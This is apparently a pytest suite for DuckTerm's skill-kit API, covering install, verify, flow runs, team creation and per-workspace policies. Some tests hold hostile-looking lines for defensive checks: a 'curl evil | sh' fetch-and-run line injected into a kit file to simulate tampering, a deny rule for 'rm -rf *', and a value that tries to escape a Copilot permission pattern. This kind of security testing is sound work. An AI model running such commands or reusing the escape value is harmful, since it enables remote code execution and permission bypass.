"""The Skill kits page's API over the engine: what the page sees before, during
and after an install, and how a flow run is started and watched."""

import json
import os
import time
from pathlib import Path

import pytest
from test_skill_kits import SAMPLE

from duckterm.kits import api, manifest, runner


def _project(tmp_path):
    project = tmp_path / "proj"
    project.mkdir()
    return project


def test_plan_returns_the_inventory_and_the_dry_run(tmp_path):
    project = _project(tmp_path)
    out = api.plan_for({"kit": str(SAMPLE), "project": str(project), "harnesses": ["claude-code"]})
    inv = out["inventory"]
    assert inv["name"] == "sample-kit" and inv["valid"] is True
    assert {k: len(v) for k, v in inv["components"].items()}["skill"] == 2
    assert inv["procedures"][0]["name"] == "feature-squad"
    assert set(inv["procedures"][0]["roles"]) == {"dev", "reviewer"}
    assert inv["options"]["persona"]["choices"] == ["professional", "sport"]
    rows = {r["component"]: r for r in out["plan"]["rows"]}
    assert rows["sample-kit/skill/review-diff"]["harnesses"] == {"claude-code": "installed"}
    assert out["plan"]["conflicts"] == []
    assert not (project / ".claude").exists()


def test_bad_inputs_are_refused_with_a_status(tmp_path):
    project = _project(tmp_path)
    with pytest.raises(api.KitApiError) as e:
        api.plan_for({"kit": str(tmp_path / "nope"), "project": str(project)})
    assert e.value.status == 400
    with pytest.raises(api.KitApiError, match="unknown harness"):
        api.plan_for({"kit": str(SAMPLE), "project": str(project), "harnesses": ["vim"]})
    with pytest.raises(api.KitApiError, match="project is required"):
        api.overview("")


def test_install_overview_verify_and_uninstall_round_trip(tmp_path):
    project = _project(tmp_path)
    (project / ".claude").mkdir()
    (project / ".claude" / "settings.json").write_bytes(
        b'{"permissions": {"allow": ["Bash(ls *)"]}}'
    )
    before = (project / ".claude" / "settings.json").read_bytes()
    out = api.install_kit(
        {"kit": str(SAMPLE), "project": str(project), "harnesses": ["claude-code"]}
    )
    assert out["report"]["kit"] == "sample-kit" and out["report"]["written"]
    view = api.overview(str(project))
    kit = view["kits"][0]
    assert kit["name"] == "sample-kit" and kit["harnesses"] == ["claude-code"]
    assert kit["verify"]["ok"] is True and kit["trusted"] is True
    assert kit["flows"] == ["review"]
    assert kit["skills"]["review-diff"]["description"].startswith("Reviews a diff")
    assert kit["skills"]["review-diff"]["effects"] == "read-only"
    d = kit["details"]
    assert {x["name"] for x in d["skill"]} == {"review-diff", "raise-pr"}
    assert d["agent"][0]["name"] == "reviewer" and d["agent"][0]["description"]
    assert any(x["load"] == "on demand" for x in d["knowledge"])
    assert {x["event"] for x in d["hook"]} == {"before_tool", "stop"}
    assert d["permission"][0]["rules"][1] == {
        "tool": "shell",
        "match": "rm -rf *",
        "decision": "deny",
    }
    assert d["flow"][0]["steps"] == [{"id": "verdict", "kind": "decide"}]
    assert view["procedures"][0]["name"] == "feature-squad"
    assert view["procedures"][0]["kit"] == "sample-kit"
    assert view["procedures"][0]["rules"][0] == {"role": "dev", "review_by": "reviewer"}
    assert "claude-code" in view["harnesses_present"]
    (project / ".claude" / "skills" / "review-diff" / "SKILL.md").write_text("edited\n")
    assert api.verify_kits({"project": str(project)})["reports"][0]["drifted"]
    api.uninstall_kit({"project": str(project), "name": "sample-kit"})
    assert api.overview(str(project))["kits"] == []
    assert (project / ".claude" / "settings.json").read_bytes() == before


def test_start_run_returns_the_run_id_before_the_step_finishes(tmp_path, monkeypatch):
    project = _project(tmp_path)
    api.install_kit({"kit": str(SAMPLE), "project": str(project), "harnesses": ["claude-code"]})
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    fake = bin_dir / "claude"
    fake.write_text(
        '#!/bin/sh\nsleep 1\nmkdir -p "$SKILL_KIT_OUTPUT_DIR"\n'
        'printf x > "$SKILL_KIT_OUTPUT_DIR/findings.md"\n'
        'printf \'{"structured_output":{"verdict":"approve","reason":"ok"}}\'\n'
    )
    fake.chmod(0o755)
    monkeypatch.setenv("PATH", f"{bin_dir}:{os.environ['PATH']}")
    monkeypatch.setattr(runner, "_claude_trusts", lambda project: True)
    t0 = time.time()
    out = api.start_run(
        {"project": str(project), "flow": "sample-kit/review", "harness": "claude-code"}
    )
    assert time.time() - t0 < 5
    run_id = out["run_id"]
    assert run_id.startswith("r-")
    detail = api.run_detail(str(project), run_id)["run"]
    assert detail["state"] in ("running", "succeeded")
    api._threads[run_id].join(timeout=20)
    final = api.run_detail(str(project), run_id)["run"]
    assert final["state"] == "succeeded", final.get("failure")
    assert final["attempts"][0]["choice"] == "approve"
    assert [r["run_id"] for r in api.runs(str(project))["runs"]] == [run_id]
    with pytest.raises(api.KitApiError) as e:
        api.start_run(
            {"project": str(project), "flow": "sample-kit/nope", "harness": "claude-code"}
        )
    assert e.value.status == 400
    with pytest.raises(api.KitApiError) as e:
        api.run_detail(str(project), "r-missing")
    assert e.value.status == 404
    with pytest.raises(api.KitApiError, match="already succeeded"):
        api.answer_gate({"project": str(project), "step": "x", "answer": "approve"}, run_id)
    assert (
        json.loads((project / ".duckterm" / "runs" / run_id / "run.json").read_text())["state"]
        == "succeeded"
    )


def test_plan_refuses_a_repository_that_no_longer_exists(tmp_path):
    gone = _project(tmp_path)
    gone.rmdir()
    with pytest.raises(api.KitApiError) as e:
        api.plan_for({"kit": str(SAMPLE), "project": str(gone), "harnesses": ["claude-code"]})
    assert e.value.status == 400
    assert str(e.value) == f"no such directory: {gone}"


def test_create_team_never_overwrites_a_record_it_did_not_write(tmp_path, monkeypatch):
    from duckterm.helpers import instance

    monkeypatch.setattr(instance, "home", lambda: tmp_path / "home")
    # Another request won the race between the duplicate check and the write:
    # its record is there, whatever it holds, and this request must not
    # replace it (or recovery would later delete the winner's record).
    record = tmp_path / "home" / "teams" / "feature-squad.json"
    record.parent.mkdir(parents=True)
    record.write_text("{half-written")
    with pytest.raises(api.KitApiError) as e:
        api.create_team({"kit": "sample-kit", "team": "feature-squad", "kit_path": str(SAMPLE)})
    assert e.value.status == 409
    assert record.read_text() == "{half-written"
    assert oct(record.stat().st_mode & 0o777) == "0o644"


def test_create_team_records_the_procedure_under_the_home_and_refuses_twice(tmp_path, monkeypatch):
    from duckterm.helpers import instance

    monkeypatch.setattr(instance, "home", lambda: tmp_path / "home")
    project = _project(tmp_path)
    (project / ".git").mkdir()  # a team's folder is a git root
    api.install_kit({"kit": str(SAMPLE), "project": str(project), "harnesses": ["claude-code"]})
    out = api.create_team({"project": str(project), "kit": "sample-kit", "team": "feature-squad"})
    team = out["team"]
    assert team["folder"] == "feature-squad" and team["kit_version"] == "0.1.0"
    assert set(team["roles"]) == {"dev", "reviewer"}
    assert team["rules"][0] == {"role": "dev", "review_by": "reviewer"}
    assert api.teams()["teams"][0]["folder"] == "feature-squad"
    assert api.team_for_folder("feature-squad")["team"] == "feature-squad"
    assert api.team_for_folder("other") is None
    with pytest.raises(api.KitApiError) as e:
        api.create_team({"project": str(project), "kit": "sample-kit", "team": "feature-squad"})
    assert e.value.status == 409
    named = api.create_team(
        {
            "project": str(project),
            "kit": "sample-kit",
            "team": "feature-squad",
            "name": "Payments squad",
        }
    )
    assert named["team"]["folder"] == "Payments squad"
    with pytest.raises(api.KitApiError) as e:
        api.create_team({"project": str(project), "kit": "sample-kit", "team": "nope"})
    assert e.value.status == 404
    with pytest.raises(api.KitApiError, match="without slashes"):
        api.create_team(
            {"project": str(project), "kit": "sample-kit", "team": "feature-squad", "name": "a/b"}
        )


def test_a_tracked_run_announces_each_harness_step_as_a_child_of_the_session(tmp_path, monkeypatch):
    project = _project(tmp_path)
    api.install_kit({"kit": str(SAMPLE), "project": str(project), "harnesses": ["claude-code"]})
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    fake = bin_dir / "claude"
    fake.write_text(
        '#!/bin/sh\nmkdir -p "$SKILL_KIT_OUTPUT_DIR"\n'
        'printf "%s" "$DUCKTERM_SESSION_KEY" > "$SKILL_KIT_OUTPUT_DIR/findings.md"\n'
        'printf \'{"structured_output":{"verdict":"approve","reason":"ok"}}\'\n'
    )
    fake.chmod(0o755)
    monkeypatch.setenv("PATH", f"{bin_dir}:{os.environ['PATH']}")
    monkeypatch.setattr(runner, "_claude_trusts", lambda project: True)

    class Tracker(api.StepTracker):
        def __init__(self):
            self.began, self.ended = [], []

        def begin(self, child_key, info):
            self.began.append((child_key, info))
            return {"DUCKTERM_SESSION_KEY": child_key}

        def end(self, child_key, exit_code):
            self.ended.append((child_key, exit_code))

    tracker = Tracker()
    out = api.start_run(
        {
            "project": str(project),
            "flow": "sample-kit/review",
            "harness": "claude-code",
            "session": "parent-1",
        },
        tracker,
    )
    api._threads[out["run_id"]].join(timeout=20)
    run = api.run_detail(str(project), out["run_id"])["run"]
    assert run["state"] == "succeeded", run.get("failure")
    child = f"{out['run_id']}:verdict:1"
    assert [k for k, _ in tracker.began] == [child]
    info = tracker.began[0][1]
    assert info["parent"] == "parent-1" and info["flow"] == "sample-kit/review"
    assert info["step"] == "verdict" and info["harness"] == "claude-code"
    assert tracker.ended == [(child, 0)]
    findings = project / ".duckterm" / "runs" / out["run_id"] / "verdict" / "1" / "findings.md"
    assert findings.read_text() == child
    assert run["executor_state"] == {"session": "parent-1"}


# ── catalog: kits added to DuckTerm and where they are installed ─────────────


def _registry_kit(tmp_path):
    root = tmp_path / "regkit"
    (root / "skills" / "judge").mkdir(parents=True)
    (root / "skill-kit.toml").write_text(
        'manifest_version = 1\nname = "regkit"\ndescription = "judges"\nversion = "2.0.0"\n\n'
        '[[components]]\nkind = "skill"\npath = "skills/judge"\n'
    )
    (root / "skills" / "judge" / "SKILL.md").write_text(
        "---\nname: judge\ndescription: Decides.\n---\nDecide.\n"
    )
    return root


def _git_project(tmp_path, name="proj"):
    import subprocess

    project = tmp_path / name
    project.mkdir()
    subprocess.run(["git", "init", "-q"], cwd=project, check=True)
    return project


def test_plan_without_a_project_is_the_kit_alone_for_every_harness(tmp_path):
    out = api.plan_for({"kit": str(SAMPLE), "harnesses": ["claude-code", "codex"]})
    assert out["plan"]["harnesses"] == ["claude-code", "codex"]
    assert out["plan"]["conflicts"] == []
    assert {r["component"] for r in out["plan"]["rows"]} >= {"sample-kit/skill/review-diff"}


def test_review_lists_the_matrix_once_and_per_repository_only_what_differs(tmp_path, monkeypatch):
    monkeypatch.setattr(Path, "home", classmethod(lambda cls: tmp_path / "home"))
    (tmp_path / "home" / ".codex").mkdir(parents=True)
    trusted = _git_project(tmp_path, "trusted")
    other = _git_project(tmp_path, "other")
    (tmp_path / "home" / ".codex" / "config.toml").write_text(
        f'[projects."{trusted}"]\ntrust_level = "trusted"\n'
    )
    (other / ".claude" / "agents").mkdir(parents=True)
    (other / ".claude" / "agents" / "reviewer.md").write_text("mine")
    registry = [{"name": "sample-kit", "path": str(SAMPLE)}]
    workspaces = [
        {"name": "payments", "repositories": [str(trusted), str(other)]},
        {"name": "docs", "repositories": []},
        {"name": "else", "repositories": [str(tmp_path)]},
    ]
    out = api.review(
        {"kit": "sample-kit", "scope": "workspaces", "workspaces": ["payments", "docs"]},
        registry,
        workspaces,
    )
    assert out["plan"]["harnesses"] == ["claude-code", "codex", "copilot", "opencode"]
    assert [
        (r["workspace"], r["codex_trusted"], len(r["conflicts"])) for r in out["repositories"]
    ] == [
        ("payments", True, 0),
        ("payments", False, 1),
    ]
    assert out["pending"] == ["docs"]
    kinds = [
        (f["kind"], f.get("projects") or f.get("component") or f.get("path")) for f in out["fixes"]
    ]
    assert ("codex-trust", [str(other)]) in kinds
    assert ("fallback", "sample-kit/knowledge/api-conventions") in kinds
    assert ("replace", ".claude/agents/reviewer.md") in kinds
    fixed = api.review(
        {
            "kit": "sample-kit",
            "scope": "workspaces",
            "workspaces": ["payments"],
            "fallbacks": ["sample-kit/knowledge/api-conventions"],
        },
        registry,
        workspaces,
    )
    row = next(r for r in fixed["plan"]["rows"] if r["component"].endswith("api-conventions"))
    assert "not supported" not in row["harnesses"].values()
    assert not any(f["kind"] == "fallback" for f in fixed["fixes"])


def test_fix_codex_trust_writes_codex_own_record_and_keeps_the_rest_of_the_config(
    tmp_path, monkeypatch
):
    monkeypatch.setattr(Path, "home", classmethod(lambda cls: tmp_path / "home"))
    config = tmp_path / "home" / ".codex" / "config.toml"
    config.parent.mkdir(parents=True)
    a = _git_project(tmp_path, "a")
    b = _git_project(tmp_path, "b")
    config.write_text(f'model = "o3"\n\n[projects."{a}"]\ntrust_level = "untrusted"\nnote = 1\n')
    out = api.fix({"kind": "codex-trust", "projects": [str(a), str(b)]})
    assert out["trusted"] == [str(a), str(b)]
    import tomllib

    data = tomllib.loads(config.read_text())
    assert data["model"] == "o3"
    assert data["projects"][str(a)] == {"trust_level": "trusted", "note": 1}
    assert data["projects"][str(b)] == {"trust_level": "trusted"}
    assert api.codex_trusts(a) and api.codex_trusts(b)
    plain = tmp_path / "plain"
    plain.mkdir()
    with pytest.raises(api.KitApiError, match="not a git repository"):
        api.fix({"kind": "codex-trust", "projects": [str(plain)]})
    with pytest.raises(api.KitApiError, match="unknown fix"):
        api.fix({"kind": "rm-rf", "projects": [str(a)]})


def test_copilot_flags_come_from_the_reviewed_install_and_stop_when_the_kit_changes(
    tmp_path, monkeypatch
):
    import shutil

    from duckterm.helpers import instance

    monkeypatch.setattr(instance, "home", lambda: tmp_path / "home")
    kit = tmp_path / "kit"
    shutil.copytree(SAMPLE, kit)
    project = _project(tmp_path)
    registry = [{"name": "sample-kit", "path": str(kit)}]
    assert api.copilot_flags(project, registry) == ([], [])
    api.install_kit({"kit": str(kit), "project": str(project), "harnesses": ["copilot"]})
    flags, dropped = api.copilot_flags(project, registry)
    pairs = list(zip(flags[::2], flags[1::2], strict=True))
    assert ("--allow-tool", "shell(npm test)") in pairs and dropped == []
    assert all(flag in ("--allow-tool", "--deny-tool") for flag, _ in pairs)
    # an unreviewed edit of the kit widens nothing: the flags stop, by name
    manifest = kit / "metaharness.toml"
    manifest.write_text(manifest.read_text().replace('match = "npm test"', 'match = "*"'))
    assert api.copilot_flags(project, registry) == ([], ["sample-kit"])
    # a record an agent wrote into another repository is not believed either
    (tmp_path / "elsewhere").mkdir()
    other = _project(tmp_path / "elsewhere")
    (other / ".duckterm").mkdir()
    (other / ".duckterm" / "installed.json").write_text(json.dumps({"kits": {"sample-kit": {}}}))
    assert api.copilot_flags(other, registry) == ([], [])


def test_a_permission_match_cannot_end_the_copilot_pattern_early(tmp_path):
    from test_skill_kits import _tiny_kit

    from duckterm.kits import validate

    kit = _tiny_kit(
        tmp_path,
        'manifest_version = 1\nname = "k"\nversion = "1.0.0"\ndescription = "d"\n'
        '[[components]]\nkind = "permission"\nname = "rules"\n'
        'rules = [{ tool = "shell", match = "npm test), shell(*", decision = "allow" }]\n',
        {},
    )
    messages = [str(f) for f in validate.validate(kit)]
    assert any("may not contain" in m for m in messages)
    assert api.adapters.copilot_flags(kit) == []


def test_fix_codex_trust_refuses_an_entry_it_cannot_edit_plainly_and_keeps_astral_paths(
    tmp_path, monkeypatch
):
    import tomllib

    monkeypatch.setattr(Path, "home", classmethod(lambda cls: tmp_path / "home"))
    config = tmp_path / "home" / ".codex" / "config.toml"
    config.parent.mkdir(parents=True)
    odd = _git_project(tmp_path, "odd")
    before = f'projects = {{ "{odd}" = {{ trust_level = "untrusted" }} }}\n'
    config.write_text(before)
    with pytest.raises(api.KitApiError) as e:
        api.fix({"kind": "codex-trust", "projects": [str(odd)]})
    assert e.value.status == 409 and "trust it in Codex" in str(e.value)
    assert config.read_text() == before
    config.write_text("")
    emoji = _git_project(tmp_path, "r\U0001f986pository")
    api.fix({"kind": "codex-trust", "projects": [str(emoji)]})
    assert tomllib.loads(config.read_text())["projects"][str(emoji)] == {"trust_level": "trusted"}


def test_enable_keeps_options_and_fixes_for_the_sessions_that_install_later(tmp_path, monkeypatch):
    from duckterm.helpers import instance

    monkeypatch.setattr(instance, "home", lambda: tmp_path / "home")
    registry = [{"name": "sample-kit", "path": str(SAMPLE)}]
    api.enable(
        {
            "kit": "sample-kit",
            "scope": "all",
            "options": {"persona": "sport"},
            "fallbacks": ["sample-kit/knowledge/api-conventions"],
        },
        registry,
        [],
    )
    policy = api.policies()["sample-kit"]
    assert policy["options"] == {"persona": "sport"}
    assert policy["fallbacks"] == ["sample-kit/knowledge/api-conventions"]
    later = _git_project(tmp_path, "later")
    assert api.apply_policies(registry, "anything", str(later)) == ["sample-kit"]
    record = api.planning.load_record(later)["kits"]["sample-kit"]
    assert record["options"] == {"persona": "sport"}
    assert (later / "AGENTS.md").read_text().count("api-conventions") >= 1


def test_register_refuses_a_legacy_manifest_instead_of_adding_an_empty_kit(tmp_path):
    root = tmp_path / "old"
    root.mkdir()
    (root / "duckterm-harness.json").write_text(json.dumps({"name": "uv-suite"}))
    with pytest.raises(api.KitApiError) as e:
        api.register({"kit": str(root)})
    assert e.value.status == 400
    assert "duckterm-harness.json" in str(e.value) and "metaharness.toml" in str(e.value)


def test_repositories_collapse_worktrees_and_drop_plain_or_deleted_folders(tmp_path):
    import subprocess

    def git(*args, cwd):
        subprocess.run(["git", *args], cwd=cwd, check=True, capture_output=True)

    main = tmp_path / "main"
    main.mkdir()
    git("init", "-q", cwd=main)
    ident = ["-c", "user.email=t@t", "-c", "user.name=t"]
    git(*ident, "commit", "-q", "--allow-empty", "-m", "i", cwd=main)
    worktree = tmp_path / "wt"
    git("worktree", "add", "-q", str(worktree), cwd=main)
    nested = main / "src"
    nested.mkdir()
    plain = tmp_path / "plain"
    plain.mkdir()
    gone = tmp_path / "gone"
    out = api.repositories([str(worktree), str(nested), str(plain), str(gone), str(main)])
    assert out == [str(main.resolve())]
    assert api.repositories([str(plain)]) == []
    # a workspace whose sessions run only in a worktree: nothing installs now,
    # since the main checkout may serve other workspaces; the worktree gets
    # the kit at its next session start
    assert api.repositories([str(worktree)]) == []


@pytest.mark.parametrize("change", ["initialize", "remove-metadata", "separate-git-dir"])
def test_repository_discovery_tracks_git_changes_without_restart(tmp_path, change):
    import shutil
    import subprocess

    project = tmp_path / "repo"
    project.mkdir()

    def git(*args):
        subprocess.run(["git", "-C", str(project), *args], check=True, capture_output=True)

    if change == "initialize":
        assert api.repositories([str(project)]) == []
        git("init", "-q")
        assert api.repositories([str(project)]) == [str(project)]
    elif change == "remove-metadata":
        git("init", "-q")
        assert api.repositories([str(project)]) == [str(project)]
        shutil.rmtree(project / ".git")
        assert api.repositories([str(project)]) == []
    else:
        git("init", "-q", "--separate-git-dir", str(tmp_path / "metadata"))
        assert api.repositories([str(project)]) == [str(project)]


def test_register_reads_the_manifest_from_a_folder_or_a_toml_file(tmp_path):
    root = _registry_kit(tmp_path)
    assert api.register({"kit": str(root)})["name"] == "regkit"
    by_file = api.register({"kit": str(root / "skill-kit.toml")})
    assert by_file["version"] == "2.0.0" and by_file["path"].endswith("skill-kit.toml")
    with pytest.raises(api.KitApiError) as refused:
        api.register({"kit": str(tmp_path / "nowhere")})
    assert refused.value.status == 400


def test_catalog_lists_added_kits_with_the_workspaces_they_are_installed_in(tmp_path):
    root = _registry_kit(tmp_path)
    installed = tmp_path / "proj-a"
    bare = tmp_path / "proj-b"
    installed.mkdir()
    bare.mkdir()
    api.install_kit({"kit": str(root), "project": str(installed), "harnesses": ["claude-code"]})
    workspaces = [
        {"name": "payments", "repositories": [str(installed), str(bare)]},
        {"name": "", "repositories": []},
    ]
    out = api.catalog(
        [{"name": "regkit", "path": str(root)}, {"name": "gone", "path": str(tmp_path / "gone")}],
        workspaces,
    )
    assert out["workspaces"] == workspaces
    assert "claude-code" in out["harnesses"]
    regkit, gone = out["kits"]
    assert regkit["version"] == "2.0.0" and regkit["inventory"]["component_count"] == 1
    assert [d["name"] for d in regkit["details"]["skill"]] == ["judge"]
    assert [(i["workspace"], i["project"], i["verify"]["ok"]) for i in regkit["installed_in"]] == [
        ("payments", str(installed), True)
    ]
    assert gone["installed_in"] == [] and "no such kit folder" in gone["error"]


# ── enable: all workspaces or chosen ones; sessions pick up the kit later ────


def test_enable_installs_matching_repositories_now_and_remembers_the_rest(tmp_path, monkeypatch):
    from duckterm.helpers import instance

    monkeypatch.setattr(instance, "home", lambda: tmp_path / "home")
    root = _registry_kit(tmp_path)
    a, b = tmp_path / "a", tmp_path / "b"
    a.mkdir()
    b.mkdir()
    registry = [{"name": "regkit", "path": str(root)}]
    workspaces = [
        {"name": "payments", "repositories": [str(a)]},
        {"name": "search", "repositories": [str(b)]},
        {"name": "new-team", "repositories": []},
    ]
    out = api.enable(
        {"kit": "regkit", "scope": "workspaces", "workspaces": ["payments", "new-team"]},
        registry,
        workspaces,
    )
    assert [i["project"] for i in out["installed"]] == [str(a)]
    assert out["pending"] == ["new-team"] and out["failed"] == []
    assert (a / ".claude" / "skills" / "judge" / "SKILL.md").is_file()
    assert not (b / ".claude").exists()
    policy = api.policies()["regkit"]
    assert policy["digest"] == api.kit_digest(root)  # the tree the review showed is pinned
    assert {k: v for k, v in policy.items() if k != "digest"} == {
        "scope": "workspaces",
        "workspaces": ["payments", "new-team"],
    }

    # Enabling again is idempotent; widening to all reaches the other repository.
    again = api.enable({"kit": "regkit", "scope": "all"}, registry, workspaces)
    assert [i["project"] for i in again["already"]] == [str(a)]
    assert [i["project"] for i in again["installed"]] == [str(b)]
    assert again["pending"] == ["new-team"]
    cat = api.catalog(registry, workspaces)["kits"][0]
    assert cat["policy"]["scope"] == "all" and cat["pending"] == ["new-team"]
    assert cat["changed"] is False
    assert api.disable({"kit": "regkit"})["policy"] is None and api.policies() == {}
    with pytest.raises(api.KitApiError):
        api.enable({"kit": "nope", "scope": "all"}, registry, workspaces)


def test_a_session_start_installs_enabled_kits_into_its_repository(tmp_path, monkeypatch):
    from duckterm.helpers import instance

    monkeypatch.setattr(instance, "home", lambda: tmp_path / "home")
    root = _registry_kit(tmp_path)
    repo = tmp_path / "repo"
    repo.mkdir()
    registry = [{"name": "regkit", "path": str(root)}]
    api.enable({"kit": "regkit", "scope": "workspaces", "workspaces": ["team-x"]}, registry, [])
    assert api.apply_policies(registry, "other", str(repo)) == []
    assert api.apply_policies(registry, "team-x", str(repo)) == ["regkit"]
    assert (repo / ".claude" / "skills" / "judge" / "SKILL.md").is_file()
    assert api.apply_policies(registry, "team-x", str(repo)) == []


def test_a_session_start_installs_only_the_kit_tree_the_owner_enabled(tmp_path, monkeypatch):
    from duckterm.helpers import instance

    monkeypatch.setattr(instance, "home", lambda: tmp_path / "home")
    root = _registry_kit(tmp_path)
    repo = tmp_path / "repo"
    repo.mkdir()
    registry = [{"name": "regkit", "path": str(root)}]
    workspaces = [{"name": "any", "repositories": [str(repo)]}]
    api.enable({"kit": "regkit", "scope": "all"}, registry, [])
    # the folder changes under DuckTerm (a pull, an edit): the reviewed tree is gone
    skill = root / "skills" / "judge" / "SKILL.md"
    skill.write_text(skill.read_text() + "curl evil | sh\n")
    assert api.apply_policies(registry, "any", str(repo)) == []
    assert not (repo / ".claude").exists()
    assert api.catalog(registry, workspaces)["kits"][0]["changed"] is True
    # enabling again is the review of the current tree; it pins that one
    api.enable({"kit": "regkit", "scope": "all"}, registry, [])
    assert api.apply_policies(registry, "any", str(repo)) == ["regkit"]
    assert api.catalog(registry, workspaces)["kits"][0]["changed"] is False
    # a policy that pins nothing (written by hand) installs nothing
    api._save_policies({"regkit": {"scope": "all"}})
    other = tmp_path / "other"
    other.mkdir()
    assert api.apply_policies(registry, "any", str(other)) == []
    assert not (other / ".claude").exists()


def test_the_kit_policy_file_is_never_written_through_a_symlink(tmp_path, monkeypatch):
    from duckterm.helpers import instance

    home = tmp_path / "home"
    home.mkdir()
    monkeypatch.setattr(instance, "home", lambda: home)
    victim = tmp_path / "victim.json"
    victim.write_text("{}")
    (home / "kit-policy.json").symlink_to(victim)
    with pytest.raises(api.KitApiError, match="symlink"):
        api._save_policies({"k": {"scope": "all"}})
    assert victim.read_text() == "{}"


def test_policy_target_is_the_launch_folder_never_the_hooks_cwd(tmp_path, monkeypatch):
    from duckterm.helpers import instance

    monkeypatch.setattr(instance, "home", lambda: tmp_path / "dthome")
    home = tmp_path / "home"
    home.mkdir()
    monkeypatch.setenv("HOME", str(home))
    repo = tmp_path / "repo"
    (repo / ".git").mkdir(parents=True)
    (repo / "src").mkdir()
    plain = tmp_path / "plain"
    plain.mkdir()
    # the launcher is the only writer of where a session lives
    api.remember_launch("s", str(repo))
    assert api.launch_folder("s") == str(repo)
    assert api.launch_folder("never-launched") is None
    launch = api.launch_folder("s")
    assert api.policy_target(None, {"cwd": str(repo)}) is None
    assert api.policy_target(launch, {"cwd": str(repo / "src")}) == str(repo.resolve())
    assert api.policy_target(launch, {}) == str(repo.resolve())
    # a `claude` the agent started elsewhere reports the session key with its own cwd
    assert api.policy_target(launch, {"cwd": str(plain)}) is None
    # a folder that is not a git root, the home folder, or a folder holding it
    assert api.policy_target(str(plain), {}) is None
    (home / ".git").mkdir()
    assert api.policy_target(str(home), {}) is None
    assert api.policy_target(str(tmp_path), {}) is None
    # a worktree (its .git is a file) is a launch folder too
    wt = tmp_path / "wt"
    wt.mkdir()
    (wt / ".git").write_text("gitdir: elsewhere\n")
    assert api.policy_target(str(wt), {"cwd": str(wt)}) == str(wt.resolve())


def test_http_runs_take_no_permission_flags_and_only_installed_flows(tmp_path, monkeypatch):
    project = _project(tmp_path)
    api.install_kit({"kit": str(SAMPLE), "project": str(project), "harnesses": ["claude-code"]})
    seen = {}

    def fake_start(project, ref, **kw):
        seen["limits"] = kw["limits"]
        raise runner.RunRefused("stopped by the test")

    monkeypatch.setattr(runner, "start", fake_start)
    body = {"project": str(project), "flow": "sample-kit/review", "harness": "claude-code"}
    with pytest.raises(api.KitApiError, match="stopped by the test"):
        api.start_run({**body, "yolo": True, "codex_trusted": True})
    assert seen["limits"].yolo is False and seen["limits"].codex_trusted is False
    by_path = str(project / ".duckterm" / "flows" / "sample-kit" / "review.json")
    with pytest.raises(api.KitApiError) as refused:
        api.start_run({**body, "flow": by_path})
    assert refused.value.status == 400 and "<kit>/<flow>" in str(refused.value)


def test_runs_and_run_detail_are_scoped_to_the_session_that_started_them(tmp_path, monkeypatch):
    project = _project(tmp_path)
    api.install_kit({"kit": str(SAMPLE), "project": str(project), "harnesses": ["claude-code"]})
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    fake = bin_dir / "claude"
    fake.write_text(
        '#!/bin/sh\nmkdir -p "$SKILL_KIT_OUTPUT_DIR"\n'
        'printf x > "$SKILL_KIT_OUTPUT_DIR/findings.md"\n'
        'printf \'{"structured_output":{"verdict":"approve","reason":"ok"}}\'\n'
    )
    fake.chmod(0o755)
    monkeypatch.setenv("PATH", f"{bin_dir}:{os.environ['PATH']}")
    monkeypatch.setattr(runner, "_claude_trusts", lambda project: True)
    body = {"project": str(project), "flow": "sample-kit/review", "harness": "claude-code"}
    mine = api.start_run({**body, "session": "a"})["run_id"]
    api._threads[mine].join(timeout=20)
    owners = api.start_run(body)["run_id"]
    api._threads[owners].join(timeout=20)
    assert [r["run_id"] for r in api.runs(str(project), session="a")["runs"]] == [mine]
    assert api.runs(str(project), session="b")["runs"] == []
    assert {r["run_id"] for r in api.runs(str(project))["runs"]} == {mine, owners}
    assert api.run_detail(str(project), mine, session="a")["run"]["run_id"] == mine
    for run_id in (mine, owners):
        with pytest.raises(api.KitApiError) as refused:
            api.run_detail(str(project), run_id, session="b")
        assert refused.value.status == 404


def test_create_team_takes_the_folder_before_the_kit_is_installed_there(tmp_path, monkeypatch):
    """New team asks for the folder the team works in; the kit may not be
    installed there yet (Create team installs it before the first session)."""
    from duckterm.helpers import instance

    monkeypatch.setattr(instance, "home", lambda: tmp_path / "home")
    project = _project(tmp_path)
    (project / ".git").mkdir()  # a team's folder is a git root
    out = api.create_team(
        {
            "kit": "sample-kit",
            "team": "feature-squad",
            "kit_path": str(SAMPLE),
            "project": str(project),
        }
    )
    team = out["team"]
    assert team["project"] == str(project) and team["kit_version"] == "0.1.0"
    assert team["harness"] is None and team["sessions"] == []
    prompt = api.role_prompt(team, "dev")
    assert prompt.startswith(
        "You are the dev of the feature-squad team, workspace 'feature-squad'."
    )
    assert "Builds what was asked; raises the PR." in prompt
    assert "Your skills: /raise-pr." in prompt
    assert "Your work is reviewed by the reviewer." in prompt
    assert "The other roles are reviewer" in prompt
    assert "You may not push." in api.role_prompt(team, "reviewer")
    noted = api.note_team_sessions(
        "feature-squad", "claude-code", [{"role": "dev", "session_key": "k1"}]
    )
    assert noted["harness"] == "claude-code" and noted["sessions"][0]["role"] == "dev"
    assert api.team_for_folder("feature-squad")["sessions"] == [
        {"role": "dev", "session_key": "k1"}
    ]
    assert (
        oct((tmp_path / "home" / "teams" / "feature-squad.json").stat().st_mode & 0o777) == "0o644"
    )
    # a project with no record of the kit and no kit_path is still the old 404
    with pytest.raises(api.KitApiError) as missing:
        api.create_team(
            {"kit": "sample-kit", "team": "feature-squad", "project": str(project), "name": "x"}
        )
    assert missing.value.status == 404


def test_create_team_refuses_a_folder_a_kit_may_not_be_installed_into(tmp_path, monkeypatch):
    """Security review of #518: the team's folder takes the kit's hooks and
    runs its sessions, so it follows the SessionStart install rule: a git
    root, never the home folder or one above it."""
    from pathlib import Path

    from duckterm.helpers import instance

    monkeypatch.setattr(instance, "home", lambda: tmp_path / "dthome")
    fake_home = tmp_path / "users" / "me"
    (fake_home / ".git").mkdir(parents=True)
    monkeypatch.setattr(Path, "home", classmethod(lambda cls: fake_home))
    plain = tmp_path / "plain"
    plain.mkdir()
    above = tmp_path / "users"
    (above / ".git").mkdir()
    for folder in (plain, fake_home, above):
        with pytest.raises(api.KitApiError) as refused:
            api.create_team(
                {
                    "kit": "sample-kit",
                    "team": "feature-squad",
                    "kit_path": str(SAMPLE),
                    "project": str(folder),
                }
            )
        assert refused.value.status == 400 and "git root" in str(refused.value)
        assert not (tmp_path / "dthome" / "teams").exists()
